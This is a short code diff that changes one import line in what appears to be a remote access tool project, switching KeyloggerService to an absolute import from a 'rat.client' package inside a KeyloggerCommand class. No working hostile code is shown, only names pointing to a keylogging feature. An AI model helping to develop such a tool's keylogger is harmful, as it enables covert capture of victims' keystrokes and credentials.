@@ -1,5 +1,5 @@
 from .base_command import BaseCommand
-from .client.keylogger_service import KeyloggerService
+from rat.client.keylogger_service import KeyloggerService
 
 
 class KeyloggerCommand(BaseCommand):
